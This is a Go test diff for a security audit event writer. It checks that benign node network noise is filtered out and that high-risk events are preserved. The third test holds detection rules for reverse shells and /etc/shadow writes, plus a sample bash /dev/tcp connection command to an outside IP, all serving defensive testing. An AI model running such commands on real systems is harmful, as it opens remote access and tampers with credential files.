@@ -153,6 +153,137 @@ func TestRuleApplyingWriterFiltersNoiseAfterRuleEnrichment(t *testing.T) {
 	}
 }
 
+func TestRuleApplyingWriterFiltersDitingViteNoiseWhenNodeNetworkRuleExists(t *testing.T) {
+	sink := &fakeEventSink{}
+	writer := newRefreshingRuleWriter(sink, &fakeRuleProvider{sets: [][]rule.Rule{{{
+		ID:        "node-network",
+		Name:      "node network",
+		EventType: "network_connect",
+		Enabled:   true,
+		Severity:  "high",
+		RiskScore: 85,
+		MatchExpr: rule.Expression{
+			Operator: "and",
+			Conditions: []rule.Condition{
+				{Field: "event_type", Op: "eq", Value: "network_connect"},
+				{Field: "process_name", Op: "in", Values: []string{"bash", "sh", "python", "node"}},
+			},
+		},
+	}}}})
+	writer.SetNoiseFilter(collectorNoiseFilterFromSystemConfig(systemconfig.PreReleaseCollectorFilterConfig()))
+	if err := writer.Refresh(context.Background()); err != nil {
+		t.Fatalf("Refresh returned error: %v", err)
+	}
+
+	err := writer.Write(context.Background(), []audit.Event{{
+		EventType:   "network_connect",
+		Username:    "diting",
+		ProcessName: "node",
+		Cmdline:     "/usr/local/bin/node /data/DiTing/frontend/node_modules/.bin/vite --host 0.0.0.0 --port 5174 --strictPort",
+		DstIP:       "127.0.0.1",
+		DstPort:     5174,
+		Protocol:    "tcp",
+		Severity:    "info",
+	}})
+	if err != nil {
+		t.Fatalf("Write returned error: %v", err)
+	}
+
+	if len(sink.events) != 0 {
+		t.Fatalf("expected DiTing vite self-noise to be filtered before high-severity preservation, got %d events", len(sink.events))
+	}
+}
+
+func TestRuleApplyingWriterFiltersRootRoutineNetworkBeforeRulePromotion(t *testing.T) {
+	sink := &fakeEventSink{}
+	writer := newRefreshingRuleWriter(sink, &fakeRuleProvider{sets: [][]rule.Rule{{{
+		ID:        "interpreter-network",
+		Name:      "interpreter network",
+		EventType: "network_connect",
+		Enabled:   true,
+		Severity:  "high",
+		RiskScore: 85,
+		MatchExpr: rule.Expression{
+			Operator: "and",
+			Conditions: []rule.Condition{
+				{Field: "event_type", Op: "eq", Value: "network_connect"},
+				{Field: "process_name", Op: "in", Values: []string{"bash", "sh", "python", "node"}},
+			},
+		},
+	}}}})
+	writer.SetNoiseFilter(collectorNoiseFilterFromSystemConfig(systemconfig.PreReleaseCollectorFilterConfig()))
+	if err := writer.Refresh(context.Background()); err != nil {
+		t.Fatalf("Refresh returned error: %v", err)
+	}
+
+	err := writer.Write(context.Background(), []audit.Event{{
+		EventType:   "network_connect",
+		Username:    "root",
+		ProcessName: "node",
+		Cmdline:     "/usr/local/bin/node /opt/app/server.js",
+		DstIP:       "10.0.0.12",
+		DstPort:     443,
+		Protocol:    "tcp",
+		Severity:    "info",
+	}})
+	if err != nil {
+		t.Fatalf("Write returned error: %v", err)
+	}
+
+	if len(sink.events) != 0 {
+		t.Fatalf("expected root routine network event to be filtered before rule promotion, got %d events", len(sink.events))
+	}
+}
+
+func TestRuleApplyingWriterPreservesRootExplicitHighRiskBeforeRulePromotion(t *testing.T) {
+	sink := &fakeEventSink{}
+	writer := newRefreshingRuleWriter(sink, &fakeRuleProvider{sets: [][]rule.Rule{{
+		{
+			ID:        "reverse-shell",
+			Name:      "reverse shell",
+			EventType: "process_exec",
+			Enabled:   true,
+			Severity:  "critical",
+			RiskScore: 95,
+			MatchExpr: rule.Expression{
+				Operator:   "and",
+				Conditions: []rule.Condition{{Field: "cmdline", Op: "contains", Value: "/dev/tcp/"}},
+			},
+		},
+		{
+			ID:        "sensitive-file-write",
+			Name:      "sensitive file write",
+			EventType: "file_access",
+			Enabled:   true,
+			Severity:  "critical",
+			RiskScore: 94,
+			MatchExpr: rule.Expression{
+				Operator: "and",
+				Conditions: []rule.Condition{
+					{Field: "file_path", Op: "contains", Value: "/etc/shadow"},
+					{Field: "file_operation", Op: "contains", Value: "write"},
+				},
+			},
+		},
+	}}})
+	writer.SetNoiseFilter(collectorNoiseFilterFromSystemConfig(systemconfig.PreReleaseCollectorFilterConfig()))
+	if err := writer.Refresh(context.Background()); err != nil {
+		t.Fatalf("Refresh returned error: %v", err)
+	}
+
+	err := writer.Write(context.Background(), []audit.Event{
+		{EventType: "process_exec", Username: "root", ProcessName: "bash", Cmdline: "bash -c 'cat < /dev/tcp/1.2.3.4/4444'", Severity: "info"},
+		{EventType: "file_access", Username: "root", ProcessName: "vim", FilePath: "/etc/shadow", FileOperation: "write", Severity: "info"},
+	})
+	if err != nil {
+		t.Fatalf("Write returned error: %v", err)
+	}
+
+	if len(sink.events) != 2 {
+		t.Fatalf("expected root explicit high-risk events to be preserved, got %d events", len(sink.events))
+	}
+}
+
 func TestCollectorNoiseFilterUsesSystemConfig(t *testing.T) {
 	filter := collectorNoiseFilterFromSystemConfig(systemconfig.CollectorFilterConfig{
 		Enabled:               true,
